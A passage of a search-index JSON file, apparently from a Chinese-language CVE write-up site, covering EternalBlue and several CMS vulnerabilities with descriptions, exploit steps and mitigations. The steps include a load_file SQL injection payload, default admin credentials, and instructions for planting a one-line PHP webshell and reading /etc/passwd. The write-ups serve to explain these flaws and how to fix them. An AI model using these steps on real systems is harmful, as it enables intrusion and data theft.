https://segmentfault.com/a/1190000042108766","title":"CVE-2017-0143"},{"location":"cves/CVE-2017/CVE-2017-0143/#cve-2017-0143","text":"","title":"CVE-2017-0143"},{"location":"cves/CVE-2017/CVE-2017-0143/#description","text":"\u6c38\u6052\u4e4b\u84dd(Eternal Blue)\u7206\u53d1\u4e8e2017\u5e744\u670814\u65e5\u665a\uff0c\u662f\u4e00\u79cd\u5229\u7528 Windows \u7cfb\u7edf\u7684 SMB \u534f\u8bae\u6f0f\u6d1e\u6765\u83b7\u53d6\u7cfb\u7edf\u7684\u6700\u9ad8\u6743\u9650\uff0c\u4ee5\u6b64\u6765\u63a7\u5236\u88ab\u5165\u4fb5\u7684\u8ba1\u7b97\u673a\u3002 \u751a\u81f3\u4e8e2017\u5e745\u670812\u65e5\uff0c \u4e0d\u6cd5\u5206\u5b50\u901a\u8fc7\u6539\u9020\u201c\u6c38\u6052\u4e4b\u84dd\u201d\u5236\u4f5c\u4e86 Wannacry \u52d2\u7d22\u75c5\u6bd2\uff0c\u4f7f\u5168\u4e16\u754c\u5927\u8303\u56f4\u5185\u906d\u53d7\u4e86\u8be5\u52d2\u7d22\u75c5\u6bd2\uff0c\u751a\u81f3\u6ce2\u53ca\u5230\u5b66\u6821\u3001\u5927\u578b\u4f01\u4e1a\u3001\u653f\u5e9c\u7b49\u673a\u6784\uff0c\u53ea\u80fd\u901a\u8fc7\u652f\u4ed8\u9ad8\u989d\u7684\u8d4e\u91d1\u624d\u80fd\u6062\u590d\u51fa\u6587\u4ef6\u3002 \u4e0d\u8fc7\u5728\u8be5\u75c5\u6bd2\u51fa\u6765\u4e0d\u4e45\u5c31\u88ab\u5fae\u8f6f\u901a\u8fc7\u6253\u8865\u4e01\u4fee\u590d\u3002","title":"Description"},{"location":"cves/CVE-2017/CVE-2017-0143/#_1","text":"\u76ee\u524d\u5df2\u77e5\u53d7\u5f71\u54cd\u7684 Windows \u7248\u672c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1aWindows NT\uff0cWindows 2000\u3001Windows XP\u3001Windows 2003\u3001Windows Vista\u3001Windows 7\u3001Windows 8\uff0cWindows 2008\u3001Windows 2008 R2\u3001Windows Server 2012 SP0\u3002","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"cves/CVE-2017/CVE-2017-0143/#what-is-smb","text":"","title":"What is SMB?"},{"location":"cves/CVE-2017/CVE-2017-0143/#smb","text":"SMB\uff08Server Message Block\uff09\u662f\u4e00\u4e2a\u534f\u8bae\u670d\u52a1\u5668\u4fe1\u606f\u5757\uff0c\u5b83\u662f\u4e00\u79cd\u5ba2\u6237\u673a/\u670d\u52a1\u5668\u3001\u8bf7\u6c42/\u54cd\u5e94\u534f\u8bae\uff0c\u901a\u8fc7 SMB \u534f\u8bae\u53ef\u4ee5\u5728\u8ba1\u7b97\u673a\u95f4\u5171\u4eab\u6587\u4ef6\u3001\u6253\u5370\u673a\u3001\u547d\u540d\u7ba1\u9053\u7b49\u8d44\u6e90\uff0c\u7535\u8111\u4e0a\u7684\u7f51\u4e0a\u90bb\u5c45\u5c31\u662f\u9760SMB\u5b9e\u73b0\u7684\uff1b SMB \u534f\u8bae\u5de5\u4f5c\u5728\u5e94\u7528\u5c42\u548c\u4f1a\u8bdd\u5c42\uff0c\u53ef\u4ee5\u7528\u5728 TCP/IP \u534f\u8bae\u4e4b\u4e0a\uff0cSMB \u4f7f\u7528 TCP/139 \u7aef\u53e3\u548c TCP/445 \u7aef\u53e3\u3002","title":"SMB \u534f\u8bae"},{"location":"cves/CVE-2017/CVE-2017-0143/#smb_1","text":"\u9996\u5148\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a SMB negport \u8bf7\u6c42\u6570\u636e\u62a5\uff0c\u5e76\u5217\u51fa\u5b83\u6240\u652f\u6301\u7684\u6240\u6709 SMB \u7684\u534f\u8bae\u7248\u672c\u3002 \u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u6d88\u606f\u540e\u54cd\u5e94\u8bf7\u6c42\uff0c\u5e76\u5217\u51fa\u5e0c\u671b\u4f7f\u7528\u7684 SMB \u534f\u8bae\u7248\u672c\u3002\u5982\u679c\u6ca1\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u534f\u8bae\u7248\u672c\u5219\u8fd4\u56de 0XFFFFH \uff0c\u7ed3\u675f\u901a\u4fe1\u3002 \u534f\u8bae\u786e\u5b9a\u540e\uff0c\u5ba2\u6237\u7aef\u8fdb\u7a0b\u5411\u670d\u52a1\u5668\u53d1\u8d77\u4e00\u4e2a\u7528\u6237\u6216\u5171\u4eab\u7684\u8ba4\u8bc1\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u901a\u8fc7\u53d1\u9001 SessetupX \u8bf7\u6c42\u6570\u636e\u5305\u5b9e\u73b0\u7684\u3002 \u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u5bf9\u7528\u6237\u540d\u548c\u5bc6\u7801\u6216\u4e00\u4e2a\u7b80\u5355\u5bc6\u7801\u5230\u670d\u52a1\u5668\uff0c\u7136\u540e\u901a\u8fc7\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a SessetupX \u5e94\u7b54\u6570\u636e\u5305\u6765\u5141\u8bb8\u6216\u62d2\u7edd\u672c\u6b21\u8fde\u63a5\u3002 \u5f53\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5b8c\u6210\u4e86\u78cb\u5546\u548c\u8ba4\u8bc1\u4e4b\u540e\uff0c\u5b83\u4f1a\u53d1\u9001\u4e00\u4e2a Tcon \u6216 TconX SMB \u6570\u636e\u62a5\u5e76\u5217\u51fa\u5b83\u60f3\u8bbf\u95ee\u7684\u7f51\u7edc\u8d44\u6e90\u7684\u540d\u79f0\uff0c\u4e4b\u540e\u4f1a\u53d1\u9001\u4e00\u4e2a TconX \u5e94\u7b54\u6570\u636e\u62a5\u4ee5\u8868\u793a\u6b64\u6b21\u8fde\u63a5\u662f\u5426\u63a5\u6536\u6216\u62d2\u7edd\u3002 \u8fde\u63a5\u5230\u76f8\u5e94\u8d44\u6e90\u540e\uff0cSMB \u5ba2\u6237\u7aef\u5c31\u80fd\u591f\u901a\u8fc7 open SMB \u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u901a\u8fc7 read SMB \u8bfb\u53d6\u6587\u4ef6\uff0c\u901a\u8fc7 write SMB \u5199\u5165\u6587\u4ef6\uff0c\u901a\u8fc7 close SMB \u5173\u95ed\u6587\u4ef6\u3002","title":"SMB \u539f\u7406"},{"location":"cves/CVE-2017/CVE-2017-0143/#what-is-eternal-blue","text":"\u6f0f\u6d1e\u51fa\u73b0\u5728 Windows SMB v1 \u4e2d\u7684\u5185\u6838\u6001\u51fd\u6570 srv!SrvOs2FeaListToNt \u5728\u5904\u7406 FEA(File Extended Attributes) \u8f6c\u6362\u65f6\uff0c\u5728\u5927\u975e\u5206\u9875\u6c60(\u5185\u6838\u7684\u6570\u636e\u7ed3\u6784\uff0cLarge Non-Paged Kernel Pool)\u4e0a\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u51fd\u6570 srv!SrvOs2FeaListToNt \u5728\u5c06 FEA list \u8f6c\u6362\u6210 NTFEA(Windows NT FEA) list \u524d\u4f1a\u8c03\u7528 srv!SrvOs2FeaListSizeToNt \u53bb\u8ba1\u7b97\u8f6c\u6362\u540e\u7684 FEA lsit \u7684\u5927\u5c0f\u3002 \u7136\u540e\u4f1a\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a srv!SrvOs2FeaListSizeToNt \u4f1a\u8ba1\u7b97 FEA list \u7684\u5927\u5c0f\u5e76\u66f4\u65b0\u5f85\u8f6c\u6362\u7684 FEA list \u7684\u5927\u5c0f \u56e0\u4e3a\u9519\u8bef\u7684\u4f7f\u7528 WORD \u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u5bfc\u81f4\u8ba1\u7b97\u51fa\u6765\u7684\u5f85\u8f6c\u6362\u7684 FEA list \u7684\u5927\u5c0f\u6bd4\u771f\u6b63\u7684 FEA list \u5927 \u56e0\u4e3a\u539f\u5148\u7684\u603b\u5927\u5c0f\u8ba1\u7b97\u9519\u8bef\uff0c\u5bfc\u81f4\u5f53 FEA list \u88ab\u8f6c\u5316\u4e3a NTFEA list \u65f6\uff0c\u4f1a\u5728\u975e\u5206\u9875\u6c60\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa \u6c38\u6052\u4e4b\u84dd\u662f\u5728 Windows \u7684 SMB \u670d\u52a1\u5904\u7406 SMB v1 \u8bf7\u6c42\u65f6\u53d1\u751f\u7684\u6f0f\u6d1e\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5bfc\u81f4\u653b\u51fb\u8005\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u901a\u8fc7\u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u4f1a\u626b\u63cf\u5f00\u653e 445 \u6587\u4ef6\u5171\u4eab\u7aef\u53e3\u7684 Windows \u673a\u5668\uff0c\u65e0\u9700\u7528\u6237\u4efb\u4f55\u64cd\u4f5c\uff0c\u53ea\u8981\u5f00\u673a\u4e0a\u7f51\uff0c\u4e0d\u6cd5\u5206\u5b50\u5c31\u80fd\u5728\u7535\u8111\u548c\u670d\u52a1\u5668\u4e2d\u690d\u5165\u52d2\u7d22\u8f6f\u4ef6\u3001\u8fdc\u7a0b\u63a7\u5236\u6728\u9a6c\u3001\u865a\u62df\u8d27\u5e01\u6316\u77ff\u673a\u7b49\u6076\u610f\u7a0b\u5e8f\u3002","title":"What is Eternal Blue?"},{"location":"cves/CVE-2017/CVE-2017-0143/#explanation-of-exploit-poc","text":"...","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2017/CVE-2017-0143/#mitigation","text":"\u7981\u7528 SMB v1 \u534f\u8bae \u6253\u5f00 Windows Update\uff0c\u6216\u624b\u52a8\u5b89\u88c5\u8865\u4e01 \u4f7f\u7528\u9632\u706b\u5899\u963b\u6b62 445 \u7aef\u53e3\u7684\u8fde\u63a5\uff0c\u6216\u8005\u4f7f\u7528\u8fdb/\u51fa\u7ad9\u89c4\u5219\u963b\u6b62 445 \u7aef\u53e3\u7684\u8fde\u63a5 \u4e0d\u8981\u968f\u610f\u6253\u5f00\u964c\u751f\u7684\u6587\u4ef6 \u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u53ca\u65f6\u66f4\u65b0\u75c5\u6bd2\u5e93","title":"Mitigation"},{"location":"cves/CVE-2017/CVE-2017-0143/#refer","text":"NSA Eternalblue SMB \u6f0f\u6d1e\u5206\u6790 Microsoft \u5b89\u5168\u516c\u544a MS17-010 - \u4e25\u91cd https://segmentfault.com/a/1190000042108766","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-25411/","text":"CVE-2022-25411 \u00b6 Description \u00b6 \u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e#486 \u53ef\u4ee5\u5220\u9664 ~/cms-108/uploads/.htaccess \uff0c\u7136\u540e\u5728 /admin/options \u4e2d\u6dfb\u52a0\u5141\u8bb8\u4e0a\u4f20\u7684\u6587\u4ef6\u7c7b\u578b\uff0c \u53ef\u4ee5\u8ba9\u9ed1\u5ba2\u7ed5\u8fc7\u9632\u62a4\u7cfb\u7edf\u4fdd\u62a4\u4e0a\u4f20\u6076\u610f PHP \u6587\u4ef6\u5e76\u6267\u884c\u6076\u610f PHP \u4ee3\u7801\uff0c\u6700\u7ec8\u5bfc\u81f4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e. Explanation of exploit; PoC \u00b6 Mitigation \u00b6 Refer \u00b6 https://nvd.nist.gov/vuln/detail/CVE-2022-25411 https://yunjing.ichunqiu.com/cve/detail/733","title":"CVE-2022-25411"},{"location":"cves/CVE-2022/CVE-2022-25411/#cve-2022-25411","text":"","title":"CVE-2022-25411"},{"location":"cves/CVE-2022/CVE-2022-25411/#description","text":"\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e#486 \u53ef\u4ee5\u5220\u9664 ~/cms-108/uploads/.htaccess \uff0c\u7136\u540e\u5728 /admin/options \u4e2d\u6dfb\u52a0\u5141\u8bb8\u4e0a\u4f20\u7684\u6587\u4ef6\u7c7b\u578b\uff0c \u53ef\u4ee5\u8ba9\u9ed1\u5ba2\u7ed5\u8fc7\u9632\u62a4\u7cfb\u7edf\u4fdd\u62a4\u4e0a\u4f20\u6076\u610f PHP \u6587\u4ef6\u5e76\u6267\u884c\u6076\u610f PHP \u4ee3\u7801\uff0c\u6700\u7ec8\u5bfc\u81f4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e.","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-25411/#explanation-of-exploit-poc","text":"","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-25411/#mitigation","text":"","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-25411/#refer","text":"https://nvd.nist.gov/vuln/detail/CVE-2022-25411 https://yunjing.ichunqiu.com/cve/detail/733","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-25488/","text":"CVE-2022-25488 \u00b6 Description \u00b6 Atom CMS v2.0 \u5728/admin/ajax/avatar.php\u9875\u9762\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e,\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305,\u6267\u884c\u4efb\u610fSQL\u8bed\u53e5,\u83b7\u53d6\u654f\u611f\u4fe1\u606f,\u751a\u81f3\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u5165\u4fb5\u63a7\u5236\u3002 Explanation of exploit; PoC \u00b6 \u6587\u4ef6 /admin/ajax/avatar.php \u7b2c 7 \u884c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\u5668\u6765\u4fdd\u62a4\uff0c\u5982\u4e0b\u56fe\uff1a \u5728 id \u53c2\u6570\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305\uff0c\u8fd4\u56de\u5185\u5bb9\u53ef\u5728 HTML \u6e90\u7801\u4e2d\u67e5\u770b\uff0c\u5982\u4e0b\u56fe\uff1a \u4f7f\u7528 Sqlmap \u5bf9\u6ce8\u5165\u70b9\u8fdb\u884c\u6ce8\u5165\uff0c\u76f4\u63a5\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff1a Mitigation \u00b6 \u8be5\u6f0f\u6d1e\u53ea\u8981\u662f\u7531\u4e8e\u672a\u5bf9 id \u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5efa\u8bae\u6dfb\u52a0\u4e00\u4e9b\u5173\u4e8e id \u7684\u8fc7\u6ee4\u5668\u3002 Refer \u00b6 https://github.com/thedigicraft/Atom.CMS/issues/257 https://nvd.nist.gov/vuln/detail/CVE-2022-25488","title":"CVE-2022-25488"},{"location":"cves/CVE-2022/CVE-2022-25488/#cve-2022-25488","text":"","title":"CVE-2022-25488"},{"location":"cves/CVE-2022/CVE-2022-25488/#description","text":"Atom CMS v2.0 \u5728/admin/ajax/avatar.php\u9875\u9762\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e,\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305,\u6267\u884c\u4efb\u610fSQL\u8bed\u53e5,\u83b7\u53d6\u654f\u611f\u4fe1\u606f,\u751a\u81f3\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u5165\u4fb5\u63a7\u5236\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-25488/#explanation-of-exploit-poc","text":"\u6587\u4ef6 /admin/ajax/avatar.php \u7b2c 7 \u884c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\u5668\u6765\u4fdd\u62a4\uff0c\u5982\u4e0b\u56fe\uff1a \u5728 id \u53c2\u6570\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305\uff0c\u8fd4\u56de\u5185\u5bb9\u53ef\u5728 HTML \u6e90\u7801\u4e2d\u67e5\u770b\uff0c\u5982\u4e0b\u56fe\uff1a \u4f7f\u7528 Sqlmap \u5bf9\u6ce8\u5165\u70b9\u8fdb\u884c\u6ce8\u5165\uff0c\u76f4\u63a5\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff1a","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-25488/#mitigation","text":"\u8be5\u6f0f\u6d1e\u53ea\u8981\u662f\u7531\u4e8e\u672a\u5bf9 id \u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5efa\u8bae\u6dfb\u52a0\u4e00\u4e9b\u5173\u4e8e id \u7684\u8fc7\u6ee4\u5668\u3002","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-25488/#refer","text":"https://github.com/thedigicraft/Atom.CMS/issues/257 https://nvd.nist.gov/vuln/detail/CVE-2022-25488","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-25578/","text":"CVE-2022-25578 \u00b6 Description \u00b6 taoCMS\u662f\u56fd\u5185\u6700\u5c0f\u529f\u80fd\u5b8c\u5584\u7684CMS\u7f51\u7ad9\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff0c\u5b83\u5728\u6587\u4ef6\u7ba1\u7406\u4e2d\u7531\u4e8e\u540e\u53f0\u7ba1\u7406\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 .htaccess \u6587\u4ef6\uff0c\u867d\u7136\u4ed6\u662f\u91c7\u7528\u767d\u540d\u5355\u4e0a\u4f20\u673a\u5236\uff0c\u4f46\u662f\u5728\u53ef\u4ee5\u4fee\u6539 .htaccess \u7684\u6761\u4ef6\u4e0b\u5b58\u5728\u8fdc\u7a0b\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 Explanation of exploit; PoC \u00b6 \u6253\u5f00\u9996\u9875\u627e\u5230\u767b\u5f55\u5165\u53e3\u3002 \u4f7f\u7528\u9ed8\u8ba4\u5bc6\u7801 admin:tao \u767b\u5f55\u540e\u53f0\u3002 \u70b9\u51fb\u6587\u4ef6\u7ba1\u7406\uff0c\u8fdb\u5165\u6587\u4ef6\u7ba1\u7406\u9875\u9762\u3002 \u7f16\u8f91 index.php \u6587\u4ef6\uff0c\u6dfb\u52a0\u4e00\u53e5\u8bdd\u6728\u9a6c\u3002 \u8bbf\u95ee index.php \u6587\u4ef6\uff0c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 Mitigation \u00b6 \u7531\u4e8e\u540e\u53f0\u7ba1\u7406\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 .htaccess \u6587\u4ef6\uff0c\u8fd9\u91cc\u9020\u6210\u6f0f\u6d1e\u7684\u5173\u952e\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 .htaccess \u6587\u4ef6\u7684\u6743\u9650\uff0c\u4f7f\u5176\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u4fee\u6539\u3002 Refer \u00b6 http://www.xinxia.ink/?p=78 https://yunjing.ichunqiu.com/cve/detail/960 https://github.com/taogogo/taocms/issues/28","title":"CVE-2022-25578"},{"location":"cves/CVE-2022/CVE-2022-25578/#cve-2022-25578","text":"","title":"CVE-2022-25578"},{"location":"cves/CVE-2022/CVE-2022-25578/#description","text":"taoCMS\u662f\u56fd\u5185\u6700\u5c0f\u529f\u80fd\u5b8c\u5584\u7684CMS\u7f51\u7ad9\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff0c\u5b83\u5728\u6587\u4ef6\u7ba1\u7406\u4e2d\u7531\u4e8e\u540e\u53f0\u7ba1\u7406\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 .htaccess \u6587\u4ef6\uff0c\u867d\u7136\u4ed6\u662f\u91c7\u7528\u767d\u540d\u5355\u4e0a\u4f20\u673a\u5236\uff0c\u4f46\u662f\u5728\u53ef\u4ee5\u4fee\u6539 .htaccess \u7684\u6761\u4ef6\u4e0b\u5b58\u5728\u8fdc\u7a0b\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-25578/#explanation-of-exploit-poc","text":"\u6253\u5f00\u9996\u9875\u627e\u5230\u767b\u5f55\u5165\u53e3\u3002 \u4f7f\u7528\u9ed8\u8ba4\u5bc6\u7801 admin:tao \u767b\u5f55\u540e\u53f0\u3002 \u70b9\u51fb\u6587\u4ef6\u7ba1\u7406\uff0c\u8fdb\u5165\u6587\u4ef6\u7ba1\u7406\u9875\u9762\u3002 \u7f16\u8f91 index.php \u6587\u4ef6\uff0c\u6dfb\u52a0\u4e00\u53e5\u8bdd\u6728\u9a6c\u3002 \u8bbf\u95ee index.php \u6587\u4ef6\uff0c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-25578/#mitigation","text":"\u7531\u4e8e\u540e\u53f0\u7ba1\u7406\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 .htaccess \u6587\u4ef6\uff0c\u8fd9\u91cc\u9020\u6210\u6f0f\u6d1e\u7684\u5173\u952e\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 .htaccess \u6587\u4ef6\u7684\u6743\u9650\uff0c\u4f7f\u5176\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u4fee\u6539\u3002","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-25578/#refer","text":"http://www.xinxia.ink/?p=78 https://yunjing.ichunqiu.com/cve/detail/960 https://github.com/taogogo/taocms/issues/28","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-26201/","text":"CVE-2022-26201 \u00b6 Description \u00b6 Victor CMS v1.0 \u53d1\u73b0\u5b58\u5728\u4e8c\u6b21\u6ce8\u5165\u6f0f\u6d1e \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e /admin/categories.php \u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7POST\u8bf7\u6c42\u5bf9 cat_title \u53c2\u6570\u6ce8\u5165SQL\u8bed\u53e5\uff0c\u8fdb\u800c\u5bfc\u81f4\u4e8c\u6b21\u6ce8\u5165\u6f0f\u6d1e\u3002 Explanation of exploit; PoC \u00b6 /admin/categories.php \u6587\u4ef6\u5206\u6790\uff0c\u5982\u4e0b\u56fe\uff1a /admin/crud_cat_function.php \u6587\u4ef6\u5206\u6790\uff0c\u5982\u4e0b\u56fe\uff1a \u70b9\u51fb\u5bfc\u822a\u680f Admin \u7ba1\u7406\u9875\u9762\uff0c\u5982\u4e0b\u56fe\uff1a \u70b9\u51fb Categroies \u8fdb\u5165\u7c7b\u522b\u7ba1\u7406\u9875\u9762\uff0c\u5728\u8f93\u5165\u6846\u4e2d\u8fdb\u884c SQL \u6ce8\u5165 '),(concat('flag:',load_file('/flag')))-- - \uff0c\u5982\u4e0b\u56fe\uff1a Mitigation \u00b6 \u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u6ce8\u5165\u548c\u8bbf\u95ee\uff0c\u6cc4\u9732\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u6570\u636e\u3002\u5efa\u8bae\uff1a \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u3002 \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8f6c\u4e49\u3002 \u4f7f\u7528\u9884\u7f16\u8bd1\u7684SQL\u8bed\u53e5\u3002 Refer \u00b6 https://github.com/truonghuuphuc/CVE/blob/main/CVE-2022-26201.pdf https://yunjing.ichunqiu.com/cve/detail/965","title":"CVE-2022-26201"},{"location":"cves/CVE-2022/CVE-2022-26201/#cve-2022-26201","text":"","title":"CVE-2022-26201"},{"location":"cves/CVE-2022/CVE-2022-26201/#description","text":"Victor CMS v1.0 \u53d1\u73b0\u5b58\u5728\u4e8c\u6b21\u6ce8\u5165\u6f0f\u6d1e \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e /admin/categories.php \u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7POST\u8bf7\u6c42\u5bf9 cat_title \u53c2\u6570\u6ce8\u5165SQL\u8bed\u53e5\uff0c\u8fdb\u800c\u5bfc\u81f4\u4e8c\u6b21\u6ce8\u5165\u6f0f\u6d1e\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-26201/#explanation-of-exploit-poc","text":"/admin/categories.php \u6587\u4ef6\u5206\u6790\uff0c\u5982\u4e0b\u56fe\uff1a /admin/crud_cat_function.php \u6587\u4ef6\u5206\u6790\uff0c\u5982\u4e0b\u56fe\uff1a \u70b9\u51fb\u5bfc\u822a\u680f Admin \u7ba1\u7406\u9875\u9762\uff0c\u5982\u4e0b\u56fe\uff1a \u70b9\u51fb Categroies \u8fdb\u5165\u7c7b\u522b\u7ba1\u7406\u9875\u9762\uff0c\u5728\u8f93\u5165\u6846\u4e2d\u8fdb\u884c SQL \u6ce8\u5165 '),(concat('flag:',load_file('/flag')))-- - \uff0c\u5982\u4e0b\u56fe\uff1a","title":"Explanation of exploit; PoC"},{"location":"cves/CVE-2022/CVE-2022-26201/#mitigation","text":"\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u6ce8\u5165\u548c\u8bbf\u95ee\uff0c\u6cc4\u9732\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u6570\u636e\u3002\u5efa\u8bae\uff1a \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8fc7\u6ee4\u3002 \u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u8f6c\u4e49\u3002 \u4f7f\u7528\u9884\u7f16\u8bd1\u7684SQL\u8bed\u53e5\u3002","title":"Mitigation"},{"location":"cves/CVE-2022/CVE-2022-26201/#refer","text":"https://github.com/truonghuuphuc/CVE/blob/main/CVE-2022-26201.pdf https://yunjing.ichunqiu.com/cve/detail/965","title":"Refer"},{"location":"cves/CVE-2022/CVE-2022-26965/","text":"CVE-2022-26965 \u00b6 Description \u00b6 \u5728 Pluck 4.7.16 \u4e2d\uff0c\u7ba1\u7406\u5458\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 /admin.php?action=themeinstall \u4e2d\u7684\u4e3b\u9898\u4e0a\u4f20\u529f\u80fd\u6765\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 Explanation of exploit; PoC \u00b6 \u9996\u5148\u4f7f\u7528 admin:admin \u767b\u5f55\u540e\u53f0\uff0c\u5982\u4e0b\u56fe\uff1a \u70b9\u51fb\u4e3b\u9898\u7ba1\u7406\uff0c\u70b9\u51fb\u4e0a\u4f20\u4e3b\u9898\uff0c\u5982\u4e0b\u56fe\uff1a 3. \u5236\u4f5c\u4e00\u53e5\u8bdd\u6728\u9a6c shell.php, \u5e76\u5c06\u76ee\u5f55\u538b\u7f29\u4e3a shell.tar.gz \u683c\u5f0f\uff0c\u5982\u4e0b\u56fe\uff1a 4. \u4e0a\u4f20 shell.tar.gz \u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff1a 5. \u4e0a\u4f20\u6210\u529f\u540e\uff0c\u4e3b\u9898\u6587\u4ef6\u5b58\u653e\u5728 /data/themes/ \u76ee\u5f55\u4e0b\uff0c\u5982\u4e0b\u56fe\uff1a 6. \u8bbf\u95ee shell.php\uff0c\u6267\u884c\u547d\u4ee4\u83b7\u53d6flag\uff0c\u5982\u4e0b\u56fe\uff1a 7. \u8bbf\u95ee shell.php\uff0c\u6267\u884c\u547d\u4ee4\u67e5\u770b /etc/passwd \u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\uff1a Mitigation \u00b6 \u8be5\u6f0f\u6d1e\u662f\u901a\u8fc7\u4e0a\u4f20\u4e3b\u9898\u6587\u4ef6\u6765\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u540d\u6765\u8fdb\u884c\u9632\u5fa1\u3002 Refer \u00b6 https://nvd.nist.gov/vuln/detail/CVE-2022-26965 https://packetstormsecurity.com/files/166336/Pluck-CMS-4.7.16-Shell-Upload.html https://github.com/pluck-cms/themes","title":"CVE-2022-26965"},{"location":"cves/CVE-2022/CVE-2022-26965/#cve-2022-26965","text":"","title":"CVE-2022-26965"},{"location":"cves/CVE-2022/CVE-2022-26965/#description","text":"\u5728 Pluck 4.7.16 \u4e2d\uff0c\u7ba1\u7406\u5458\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 /admin.php?action=themeinstall \u4e2d\u7684\u4e3b\u9898\u4e0a\u4f20\u529f\u80fd\u6765\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"Description"},{"location":"cves/CVE-2022/CVE-2022-26965/#explanation-of-exploit-poc","text":"\u9996\u5148\u4f7f\u7528 admin:admin \u767b\u5f55\u540e\u53f0\uff0c\u5982\u4e0b\u56fe\uff1a 